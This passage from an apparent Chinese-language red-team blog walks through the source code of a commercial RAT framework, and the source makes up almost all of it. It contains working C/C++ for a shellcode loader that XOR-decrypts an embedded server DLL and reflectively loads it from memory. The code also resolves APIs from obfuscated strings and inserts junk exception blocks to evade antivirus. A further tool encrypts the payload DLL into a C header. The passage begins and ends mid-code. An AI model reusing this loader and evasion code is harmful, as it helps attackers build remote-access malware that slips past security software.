79;if (i % 5 == 0)j = 0;}}unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};typedef int (WINAPI *Fuck)(MODIFY_DATA,LPCTSTR lpData);//typedef BOOL (* MyDLL)();void Fuck_OFF( const char *name,LPSTR LpData){HMEMORYMODULE hDll;Fuck pfn;try{if(1+1==2)throw 93;}catch (...){DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);}//DecryptData((unsigned char *)g_ShellCodeFileBuff,g_ShellCodeFileSize,1987);try{if(1+1==2)throw 36;}catch (...){hDll=MemoryLoadLibrary(g_ShellCodeFileBuff);}try{if(1+1==2)throw 39;}catch (...){Sleep(20);}if (hDll==NULL)return ;try{if(1+1==2)throw 29;}catch (...){try{if(1+1==2)throw 97;}catch (...){pfn=(Fuck)MemoryGetProcAddress(hDll,name);}if (pfn==NULL){try{if(1+1==2)throw 82;}catch (...){MemoryFreeLibrary(hDll);}return;}pfn(modify_data,LpData);if (hDll!=NULL){try{if(1+1==2)throw 85;}catch (...){MemoryFreeLibrary(hDll);}try{if(1+1==2)throw 36;}catch (...){hDll=NULL;}}try{if(1+1==2)throw 33;}catch (...){ExitProcess(0);}}}int APIENTRY WinMain(HINSTANCE hInstance,                     HINSTANCE hPrevInstance,                     LPSTR     lpCmdLine,                     int       nCmdShow){ // TODO: Place code here.char shellex[]={'S','h','e','l','l','e','x','\0'};Fuck_OFF(shellex,"");    //return 0;return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队商业版RAT框架源码免杀解读（二）"><a href="#红队商业版RAT框架源码免杀解读（二）" class="headerlink" title="红队商业版RAT框架源码免杀解读（二）"></a>红队商业版RAT框架源码免杀解读（二）</h2><pre class="line-numbers language-none"><code class="language-none">#ifndef IMAGE_SIZEOF_BASE_RELOCATION// Vista SDKs no longer define IMAGE_SIZEOF_BASE_RELOCATION!?#define IMAGE_SIZEOF_BASE_RELOCATION (sizeof(IMAGE_BASE_RELOCATION))#endif#pragma warning( disable : 4311 4312 )#include &lt;Windows.h&gt;#include &lt;winnt.h&gt;#include &lt;Windows.h&gt;#include &lt;TCHAR.H&gt;typedef void *HMEMORYMODULE;#ifdef __cplusplusextern "C" {#endifHMEMORYMODULE MemoryLoadLibrary(const void *);FARPROC MemoryGetProcAddress(HMEMORYMODULE, const char *);void MemoryFreeLibrary(HMEMORYMODULE);#ifdef __cplusplus}#endiftypedef struct {PIMAGE_NT_HEADERS headers;unsigned char *codeBase;HMODULE *modules;int numModules;int initialized;} MEMORYMODULE, *PMEMORYMODULE;typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);#define GET_HEADER_DICTIONARY(module, idx)&amp;(module)-&gt;headers-&gt;OptionalHeader.DataDirectory[idx]///-------------------------------------------MyFunctions__declspec(naked) char __fastcall upcaseA(char c){__asm{mov al, clcmp al, 'a'jl m1cmp al, 'z'jg m1and al, 0xdfm1:retn}}int __fastcall strcmpiA(const char *s1, const char *s2){unsigned long k = 0;unsigned char c1, c2;do{c1 = upcaseA(s1[k]);c2 = upcaseA(s2[k]);if (c1 &gt; c2){return 1;}else if (c1 &lt; c2){return -1;};k++;} while ((c1 | c2) != 0);return 0;}void myfree(void *p){typedef BOOL(WINAPI*HeapFreeT)(__inout HANDLE hHeap,__in    DWORD dwFlags,__deref LPVOID lpMem);char AOiHr[] = {'H','e','a','p','F','r','e','e','\0'};char dcCRF[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapFree");typedef HANDLE(WINAPI*GetProcessHeapT)(VOID);char GWcOq[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary(dcCRF),GWcOq);    pHeapFree(pGetProcessHeap(), 0, p);}////------------------------------------static void CopySections(const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module){typedef LPVOID(WINAPI*VirtualAllocT)(__in_opt LPVOID lpAddress,__in     SIZE_T dwSize,__in     DWORD flAllocationType,__in     DWORD flProtect);char uitgn[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};char qyasB[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};VirtualAllocT pVirtualAlloc=(VirtualAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualAlloc");int i, size;unsigned char *codeBase = module-&gt;codeBase;unsigned char *dest;PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module-&gt;headers);for (i=0; i&lt;module-&gt;headers-&gt;FileHeader.NumberOfSections; i++, section++){if (section-&gt;SizeOfRawData == 0){// section doesn't contain data in the dll itself, but may define// uninitialized datasize = old_headers-&gt;OptionalHeader.SectionAlignment;if (size &gt; 0){dest = (unsigned char *)VirtualAlloc(codeBase + section-&gt;VirtualAddress,size,MEM_COMMIT,PAGE_READWRITE);section-&gt;Misc.PhysicalAddress = (DWORD)dest;memset(dest, 0, size);}// section is emptycontinue;}// commit memory block and copy data from dlldest = (unsigned char *)VirtualAlloc(codeBase + section-&gt;VirtualAddress,section-&gt;SizeOfRawData,MEM_COMMIT,PAGE_READWRITE);try{if(1+1==2)throw 85;}catch (...){memcpy(dest, data + section-&gt;PointerToRawData, section-&gt;SizeOfRawData);}section-&gt;Misc.PhysicalAddress = (DWORD)dest;}}void *myrealloc(void *p, size_t size){typedef LPVOID(WINAPI*HeapReAllocT)(__inout HANDLE hHeap,__in    DWORD dwFlags,__deref LPVOID lpMem,__in    SIZE_T dwBytes);char lygUR[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};char gfKIk[] = {'H','e','a','p','R','e','A','l','l','o','c','\0'};HeapReAllocT pHeapReAlloc=(HeapReAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapReAlloc");typedef LPVOID(WINAPI*HeapAllocT)(__in HANDLE hHeap,__in DWORD dwFlags,__in SIZE_T dwBytes);char nGOQF[] = {'H','e','a','p','A','l','l','o','c','\0'};HeapAllocT pHeapAlloc=(HeapAllocT)GetProcAddress(LoadLibrary("kernel32.dll"),"HeapAlloc");typedef HANDLE(WINAPI*GetProcessHeapT)(VOID);char GWcOq[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("kernel32.dll"),"GetProcessHeap");    if (p)        return pHeapReAlloc(pGetProcessHeap(), 0, p, size);    else        return pHeapAlloc(pGetProcessHeap(), 0, size);}// Protection flags for memory pages (Executable, Readable, Writeable)static int ProtectionFlags[2][2][2] = {{// not executable{PAGE_NOACCESS, PAGE_WRITECOPY},{PAGE_READONLY, PAGE_READWRITE},}, {// executable{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},},};static void FinalizeSections(PMEMORYMODULE module){typedef BOOL(WINAPI*VirtualFreeT)(__in LPVOID lpAddress,__in SIZE_T dwSize,__in DWORD dwFreeType);VirtualFreeT pVirtualFree=(VirtualFreeT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualFree");typedef BOOL(WINAPI*VirtualProtectT)(__in  LPVOID lpAddress,__in  SIZE_T dwSize,__in  DWORD flNewProtect,__out PDWORD lpflOldProtect);char nOVLO[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','\0'};VirtualProtectT pVirtualProtect=(VirtualProtectT)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualProtect");int i;PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module-&gt;headers);// loop through all sections and change access flagsfor (i=0; i&lt;module-&gt;headers-&gt;FileHeader.NumberOfSections; i++, section++){DWORD protect, oldProtect, size;int executable = (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0;int readable =   (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) != 0;int writeable =  (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) != 0;if (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_DISCARDABLE){// section is not needed any more and can safely be freedpVirtualFree((LPVOID)section-&gt;Misc.PhysicalAddress, section-&gt;SizeOfRawData, MEM_DECOMMIT);continue;}// determine protection flags based on characteristicsprotect = ProtectionFlags[executable][readable][writeable];if (section-&gt;Characteristics &amp; IMAGE_SCN_MEM_NOT_CACHED)protect |= PAGE_NOCACHE;// determine size of regionsize = section-&gt;SizeOfRawData;if (size == 0){if (section-&gt;Characteristics &amp; IMAGE_SCN_CNT_INITIALIZED_DATA)size = module-&gt;headers-&gt;OptionalHeader.SizeOfInitializedData;else if (section-&gt;Characteristics &amp; IMAGE_SCN_CNT_UNINITIALIZED_DATA)size = module-&gt;headers-&gt;OptionalHeader.SizeOfUninitializedData;}if (size &gt; 0){// change memory access flagsif (pVirtualProtect((LPVOID)section-&gt;Misc.PhysicalAddress, section-&gt;SizeOfRawData, protect, &amp;oldProtect) == 0){//OutputLastError("Error protecting memory page");}}}}static void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){DWORD i;unsigned char *codeBase = module-&gt;codeBase;PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);if (directory-&gt;Size &gt; 0){PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(codeBase + directory-&gt;VirtualAddress);for (; relocation-&gt;VirtualAddress &gt; 0; ){unsigned char *dest = (unsigned char *)(codeBase + relocation-&gt;VirtualAddress);unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);for (i=0; i&lt;((relocation-&gt;SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2); i++, relInfo++){DWORD *patchAddrHL;int type, offset;// the upper 4 bits define the type of relocationtype = *relInfo &gt;&gt; 12;// the lower 12 bits define the offsetoffset = *relInfo &amp; 0xfff;switch (type){case IMAGE_REL_BASED_ABSOLUTE:// skip relocationbreak;case IMAGE_REL_BASED_HIGHLOW:// change complete 32 bit addresspatchAddrHL = (DWORD *)(dest + offset);*patchAddrHL += delta;break;default://printf("Unknown relocation: %d\n", type);break;}}// advance to next relocation blockrelocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation-&gt;SizeOfBlock);}}}static int BuildImportTable(PMEMORYMODULE module){//return 0;//201typedef BOOL(WINAPI*IsBadReadPtrT)(__in_opt CONST VOID *lp,__in     UINT_PTR ucb);char scfXK[] = {'I','s','B','a','d','R','e','a','d','P','t','r','\0'};char eYhRS[] = {'K','E','R','N','E','L','3','2','.','d','l','l','\0'};IsBadReadPtrT pIsBadReadPtr=(IsBadReadPtrT)GetProcAddress(LoadLibrary(eYhRS),scfXK);//return 0;//202int result=1;unsigned char *codeBase = module-&gt;codeBase;PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);if (directory-&gt;Size &gt; 0){//return 0;//203PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory-&gt;VirtualAddress);for (; !pIsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) &amp;&amp; importDesc-&gt;Name; importDesc++){//return 0;//204DWORD *thunkRef, *funcRef;HMODULE handle = LoadLibraryA((LPCSTR)(codeBase + importDesc-&gt;Name));if (handle == INVALID_HANDLE_VALUE){//OutputDebugString(_T("Can't load library"));result = 0;break;}//return 0;//205module-&gt;modules = (HMODULE *)myrealloc(module-&gt;modules, (module-&gt;numModules+1)*(sizeof(HMODULE)));if (module-&gt;modules == NULL){result = 0;break;}//return 0;//206module-&gt;modules[module-&gt;numModules++] = handle;if (importDesc-&gt;OriginalFirstThunk){thunkRef = (DWORD *)(codeBase + importDesc-&gt;OriginalFirstThunk);funcRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);} else {// no hint tablethunkRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);funcRef = (DWORD *)(codeBase + importDesc-&gt;FirstThunk);}//return 0;//207for (; *thunkRef; thunkRef++, funcRef++){if IMAGE_SNAP_BY_ORDINAL(*thunkRef)*funcRef = (DWORD)GetProcAddress(handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));else {try{if(1+1==2)throw 66;}catch (...){PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);*funcRef = (DWORD)GetProcAddress(handle, (LPCSTR)&amp;thunkData-&gt;Name);}}//return 0;//208try{if(1+1==2)throw 66;}catch (...){if (*funcRef == 0){try{if(1+1==2)throw 66;}catch (...){result = 0;}break;}}//return 0;//209}//return 0;//210if (!result)break;//return 0;//211}}//return 0;//212return result;}HMEMORYMODULE MemoryLoadLibrary(const void *data){//return 0;//7//return 0;//8PMEMORYMODULE result;PIMAGE_DOS_HEADER dos_header;PIMAGE_NT_HEADERS old_header;unsigned char *code, *headers;DWORD locationDelta;DllEntryProc DllEntry;BOOL successfull;dos_header = (PIMAGE_DOS_HEADER)data;if (dos_header-&gt;e_magic != IMAGE_DOS_SIGNATURE){//OutputDebugString(_T("Not a valid executable file.\n"));return NULL;}old_header = (PIMAGE_NT_HEADERS)&amp;((const unsigned char *)(data))[dos_header-&gt;e_lfanew];if (old_header-&gt;Signature != IMAGE_NT_SIGNATURE){//OutputDebugString(_T("No PE header found.\n"));return NULL;}// reserve memory for image of librarycode = (unsigned char *)VirtualAlloc((LPVOID)(old_header-&gt;OptionalHeader.ImageBase),old_header-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);    if (code == NULL)        // try to allocate memory at arbitrary position        code = (unsigned char *)VirtualAlloc(NULL, old_header-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);if (code == NULL){//OutputDebugString(_T("Can't reserve memory"));return NULL;}result = (PMEMORYMODULE)HeapAlloc(GetProcessHeap(), 0, sizeof(MEMORYMODULE));result-&gt;codeBase = code;result-&gt;numModules = 0;result-&gt;modules = NULL;result-&gt;initialized = 0;//return 0;//14// XXX: is it correct to commit the complete memory region at once?    //      calling DllEntry raises an exception if we don't...try{if(1+1==2)throw 63;}catch (...){VirtualAlloc(code,old_header-&gt;OptionalHeader.SizeOfImage,MEM_COMMIT,PAGE_READWRITE);}// commit memory for headersheaders = (unsigned char *)VirtualAlloc(code,old_header-&gt;OptionalHeader.SizeOfHeaders,MEM_COMMIT,PAGE_READWRITE);//return 0;//16// copy PE header to codememcpy(headers, dos_header, dos_header-&gt;e_lfanew + old_header-&gt;OptionalHeader.SizeOfHeaders);result-&gt;headers = (PIMAGE_NT_HEADERS)&amp;((const unsigned char *)(headers))[dos_header-&gt;e_lfanew];// update positionresult-&gt;headers-&gt;OptionalHeader.ImageBase = (DWORD)code;// copy sections from DLL file block to new memory locationCopySections((const unsigned char *)data, old_header, result);// adjust base address of imported datalocationDelta = (DWORD)(code - old_header-&gt;OptionalHeader.ImageBase);if (locationDelta != 0)PerformBaseRelocation(result, locationDelta);// load required dlls and adjust function table of importsif (!BuildImportTable(result));//goto error;//return 0;//20// mark memory pages depending on section headers and release// sections that are marked as "discardable"FinalizeSections(result);// get entry point of loaded libraryif (result-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint != 0){// //return 0;//223// notify library about attaching to processtry{if(1+1==2)throw 31;}catch (...){DllEntry = (DllEntryProc)(code + result-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint);}try{if(1+1==2)throw 31;}catch (...){successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);// }result-&gt;initialized = 1;//return 0;//22}return (HMEMORYMODULE)result;//error:// cleanup// //  MemoryFreeLibrary(result);return NULL;}FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name){unsigned char *codeBase = ((PMEMORYMODULE)module)-&gt;codeBase;int idx=-1;DWORD i, *nameRef;WORD *ordinal;PIMAGE_EXPORT_DIRECTORY exports;PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);if (directory-&gt;Size == 0)// no export table foundreturn NULL;exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory-&gt;VirtualAddress);if (exports-&gt;NumberOfNames == 0 || exports-&gt;NumberOfFunctions == 0)// DLL doesn't export anythingreturn NULL;// search function name in list of exported namesnameRef = (DWORD *)(codeBase + exports-&gt;AddressOfNames);ordinal = (WORD *)(codeBase + exports-&gt;AddressOfNameOrdinals);for (i=0; i&lt;exports-&gt;NumberOfNames; i++, nameRef++, ordinal++)if (strcmpiA(name, (const char *)(codeBase + *nameRef)) == 0){idx = *ordinal;break;}if (idx == -1)// exported symbol not foundreturn NULL;if ((DWORD)idx &gt; exports-&gt;NumberOfFunctions)// name &lt;-&gt; ordinal number don't matchreturn NULL;// // AddressOfFunctions contains the RVAs to the "real" functions return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports-&gt;AddressOfFunctions + (idx*4)));}void MemoryFreeLibrary(HMEMORYMODULE mod){int i;PMEMORYMODULE module = (PMEMORYMODULE)mod;//return ;//llllllllllllllllllllllllllllll if (module != NULL) {if (module-&gt;initialized != 0){// notify library about detaching from processDllEntryProc DllEntry = (DllEntryProc)(module-&gt;codeBase + module-&gt;headers-&gt;OptionalHeader.AddressOfEntryPoint);(*DllEntry)((HINSTANCE)module-&gt;codeBase, DLL_PROCESS_DETACH, 0);module-&gt;initialized = 0;}if (module-&gt;modules != NULL){// free previously opened librariesfor (i=0; i&lt;module-&gt;numModules; i++)if (module-&gt;modules[i] != INVALID_HANDLE_VALUE)FreeLibrary(module-&gt;modules[i]);myfree(module-&gt;modules);}if (module-&gt;codeBase != NULL)// release memory of libraryVirtualFree(module-&gt;codeBase, 0, MEM_RELEASE);typedef HANDLE(WINAPI*GetProcessHeapT)(VOID );GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetProcessHeap");HeapFree(GetProcessHeap(), 0, module);}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="红队商业版RAT框架源码结构（三）"><a href="#红队商业版RAT框架源码结构（三）" class="headerlink" title="红队商业版RAT框架源码结构（三）"></a>红队商业版RAT框架源码结构（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1651025450099/fa4de52030e84ad3940e4b4f070c056f.png" alt="image.png"></p><h5 id="核心源码部分（加密shellcode）"><a href="#核心源码部分（加密shellcode）" class="headerlink" title="核心源码部分（加密shellcode）"></a>核心源码部分（加密shellcode）</h5><pre class="line-numbers language-none"><code class="language-none">// ShellCode.cpp : Defines the entry point for the console application.//#include "stdafx.h"#include &lt;stdlib.h&gt;#include &lt;Windows.h&gt;void EncrypMain(char *Buff, int Size, char *AddTable) //加密/解密服务端文件(Server.dll){for (int i=0, j=0; i&lt;Size; i++){Buff[i] ^= AddTable[j++] % 17 + 55 + 77 + 77;if (i % 3 == 0)j = 0;}}BOOL SaveDr32(char *FileName) //生成DriverCode32(DriverCode32.h){HANDLE hSysFile;DWORD dwSysSize;LPVOID pSysBuff;DWORD BytesRead;LPVOID pOutBuff;HANDLE hOutFile;DWORD BytesWritten;hSysFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (hSysFile == INVALID_HANDLE_VALUE)return FALSE;dwSysSize  = GetFileSize(hSysFile, 0);pSysBuff = VirtualAlloc(NULL, dwSysSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pSysBuff == NULL){CloseHandle(hSysFile);return FALSE;}if (!ReadFile(hSysFile, pSysBuff, dwSysSize, &amp;BytesRead, NULL)){VirtualFree(pSysBuff, 0, MEM_RELEASE);CloseHandle(hSysFile);return FALSE;}CloseHandle(hSysFile);pOutBuff = VirtualAlloc(NULL, (dwSysSize*5-1)+((dwSysSize+32-1)/32*2), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);if (pOutBuff == NULL){VirtualFree(pSysBuff, 0, MEM_RELEASE);return FALSE;}char *pDllChar = (char *)pSysBuff;char *pOutChar = (char *)pOutBuff;for (DWORD i = 0; i &lt; dwSysSize; i++){if (i == dwSysSize - 1){sprintf(pOutChar, "0x%0.2X", (unsigned char)*pDllChar++);pOutChar += 4;}else{sprintf(pOutChar, "0x%0.2X,", (unsigned char)*pDllChar++);pOutChar += 5;}if (i % 32 == 31 || i == dwSysSize - 1){*pOutChar++ = '\r';*pOutChar++ = '\n';}}VirtualFree(pSysBuff, 0, MEM_RELEASE);char OutData1[] = "/*\r\n DriverCode32 By Anonymity\r\n My QQ ????????\r\n"" 直接include此单元，使用 DriverCode32SaveFile(\"xxx.xxx\");即可生成文件\r\n*/\r\n\r\n";char OutData2[] = "#ifndef _HEX_DRIVERCODE32_\r\n#define _HEX_DRIVERCODE32_\r\n#include &lt;windows.h&gt;\r\n\r\n";char OutData3[64] = {0};sprintf(OutData3, "const g_DriverCode32FileSize = %d;\r\n", dwSysSize);char OutData4[] = "unsigned char g_DriverCode32FileBuff[] = {\r\n";char OutData5[] = "};\r\n\r\n";char OutData6[] = "/*\r\nbool DriverCode32SaveFile(char *FileName)\r\n{\r\n\tbool Result = false;""\r\n\tHANDLE hFile;\r\n\tDWORD dwBytesWritten;\r\n""\thFile = CreateFile(FileName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);\r\n""\tif (hFile == INVALID_HANDLE_VALUE) Result = false;\r\n""\tif (WriteFile(hFile, g_DriverCode32FileBuff, g_DriverCode32FileSize, &amp;dwBytesWritten, NULL)) Result = true;\r\n""\tCloseHandle(hFile);\r\n\treturn Result;\r\n}\r\n*/\r\n\r\n#endif\r\n";hOutFile = CreateFile("DriverCode32.h", GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, NULL);if (hOutFile == INVALID_HANDLE_VALUE){VirtualFree(pOutBuff, 0, MEM_RELEASE);return FALSE;}if (!WriteFile(hOutFile, OutData1, strlen(OutData1), &amp;BytesWritten, 